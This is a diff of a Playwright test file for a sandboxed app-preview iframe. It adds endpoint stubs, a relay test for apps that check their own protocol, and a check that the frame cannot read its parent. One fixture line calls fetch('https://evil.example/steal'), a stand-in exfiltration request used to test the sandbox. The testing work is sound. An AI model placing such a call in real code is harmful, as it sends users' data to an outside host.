@@ -6,7 +6,8 @@ import { dirname, join } from 'node:path';
 import { tmpdir } from 'node:os';
 import { fileURLToPath } from 'node:url';
 import { SCAFFOLD_FILES, SCAFFOLD_PACKAGE } from '../../stacks/react-hono/scaffold.ts';
-import { previewDocument } from '../../apps/app/src/server/built-app.ts';
+import { previewDocument as previewFrameDocument } from '../../apps/app/src/shared/preview-frame.ts';
+import { previewDocument as previewAppDocument } from '../../apps/app/src/server/built-app.ts';
 
 // REAL React component and browser sandbox; artifact bytes are SIMULATED fixtures.
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
@@ -115,9 +116,15 @@ test('storage bridge rejects the wrong window, wrong nonce and oversized records
 
 test('failed access has a visible retry; custom workflow content is fetched and download remains explicit', async ({ page }) => {
 	let reads = 0;
-	await page.route('**/api/projects/project-one/workflow/preview/output-one', route => {
+	await page.route('**/api/projects/project-one/workflow/preview/output-one/seed', (route) => {
 		reads++;
-		return reads === 1 ? route.fulfill({ status: 403, body: 'denied' }) : route.fulfill({ contentType: 'text/html', body: HTML });
+		return reads === 1
+			? route.fulfill({ status: 403, body: 'denied' })
+			: route.fulfill({ contentType: 'application/json', body: '{"seedRef":"seed-ref"}' });
+	});
+	await page.route('**/api/projects/project-one/workflow/preview/output-one/document*', (route) => {
+		const nonce = new URL(route.request().url()).searchParams.get('nonce') ?? '';
+		return route.fulfill({ contentType: 'text/html', body: previewFrameDocument(HTML, nonce, {}, true, 'web') });
 	});
 	await page.goto(`${base}/?workflow=1`);
 	await expect(page.getByRole('alert')).toContainText('You do not have access');
@@ -149,11 +156,61 @@ fetch('https://evil.example/steal').then(function () { document.querySelector('#
 load();
 </script></body></html>`;
 
+/**
+ * The frame document endpoints, as Caddie serves them: the app's saved data
+ * goes up (a content-addressed seed), and the frame document comes back over
+ * http(s) so the app sees the protocol it sees in production.
+ */
+async function stubFrameDocument(page: import('@playwright/test').Page, appHtml: string, seed: Record<string, string> = {}) {
+	await page.route('**/api/projects/project-one/workflow/preview/output-one/seed', (route) =>
+		route.fulfill({ contentType: 'application/json', body: JSON.stringify({ seedRef: 'seed-ref' }) }),
+	);
+	await page.route('**/api/projects/project-one/workflow/preview/output-one/document*', (route) => {
+		const nonce = new URL(route.request().url()).searchParams.get('nonce') ?? '';
+		return route.fulfill({ contentType: 'text/html', body: previewFrameDocument(appHtml, nonce, seed, true, 'web') });
+	});
+}
+
+test('an app that checks its own origin still reaches its server through the relay', async ({ page }) => {
+	// HerdVoice, 2026-10-22: the app asked "can I reach the API?" by testing
+	// window.location.protocol, and in a `srcdoc` frame that is "about:" — so
+	// it decided it was offline and never called its server. The frame is now
+	// served over http(s) by Caddie, so the app sees the protocol it sees in
+	// production, while the frame's origin stays opaque.
+	const guarded = `<!doctype html><html><head><title>Guarded</title></head><body><p id="status">idle</p>
+<script>
+function canReachApi() { return window.location.protocol === 'https:' || window.location.protocol === 'http:'; }
+(async function () {
+  if (!canReachApi()) { document.querySelector('#status').textContent = 'offline'; return; }
+  try { const res = await fetch('/api/herd/timeline'); document.querySelector('#status').textContent = 'reached ' + res.status; }
+  catch (error) { document.querySelector('#status').textContent = 'failed: ' + error.message; }
+})();
+</script></body></html>`;
+	const relayed: string[] = [];
+	await stubFrameDocument(page, guarded);
+	await page.route('**/api/projects/project-one/workflow/preview/output-one/app', async (route) => {
+		const request = route.request().postDataJSON() as { path: string };
+		relayed.push(request.path);
+		return route.fulfill({
+			contentType: 'application/json',
+			body: JSON.stringify({ status: 200, headers: [['content-type', 'application/json']], body: Buffer.from('{"cases":[]}').toString('base64') }),
+		});
+	});
+	await page.goto(`${base}/?backend`);
+	const frame = page.frameLocator('iframe');
+	await expect(frame.locator('#status')).toHaveText('reached 200', { timeout: 15_000 });
+	expect(relayed).toContain('/api/herd/timeline');
+	// The frame's origin stays opaque: it can neither read the workspace's
+	// document nor its cookies.
+	const generated = page.frames().find((item) => item.name() === 'caddie-interactive-preview')!;
+	expect(await generated.evaluate(`(() => { try { return parent.document.body.innerHTML; } catch (e) { return e.name; } })()`)).toBe('SecurityError');
+});
+
 test('an app with a server reads and writes through the relay and keeps its own cookie', async ({ page }) => {
 	const notes: string[] = [];
 	const relayed: Array<{ method: string; path: string; headers: Array<[string, string]>; body: string | null }> = [];
 	let resets = 0;
-	await page.route('**/api/projects/project-one/workflow/preview/output-one', (route) => route.fulfill({ contentType: 'text/html', body: BACKEND_HTML }));
+	await stubFrameDocument(page, BACKEND_HTML);
 	await page.route('**/api/projects/project-one/workflow/preview-data/reset', (route) => {
 		resets += 1;
 		notes.length = 0;
@@ -208,7 +265,7 @@ test('an app with a server reads and writes through the relay and keeps its own 
 });
 
 test('a relay failure reaches the app as a network error, not a crash', async ({ page }) => {
-	await page.route('**/api/projects/project-one/workflow/preview/output-one', (route) => route.fulfill({ contentType: 'text/html', body: BACKEND_HTML }));
+	await stubFrameDocument(page, BACKEND_HTML);
 	await page.route('**/api/projects/project-one/workflow/preview/output-one/app', (route) =>
 		route.fulfill({ status: 503, contentType: 'application/json', body: JSON.stringify({ error: 'PREVIEW_RUNTIME_UNAVAILABLE', message: "Trying apps with a server needs Cloudflare's Worker Loader, which isn't available here." }) }),
 	);
@@ -261,7 +318,7 @@ test('an app built by the template carries its WebAssembly file into the preview
 		const [command, ...args] = SCAFFOLD_PACKAGE.scripts.build.split('&&')[0]!.trim().split(/\s+/);
 		execFileSync(command!, args, { cwd: app, stdio: 'pipe' });
 		expect(readdirSync(join(app, 'dist'))).toEqual(['main.js']); // nothing left behind for Caddie to drop
-		const html = previewDocument({ js: readFileSync(join(app, 'dist', 'main.js'), 'utf8'), css: '' });
+		const html = previewAppDocument({ js: readFileSync(join(app, 'dist', 'main.js'), 'utf8'), css: '' });
 		await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: html }));
 		await page.goto(base);
 		await expect(page.frameLocator('iframe').locator('#root')).toHaveText('WebAssembly ran: 42');
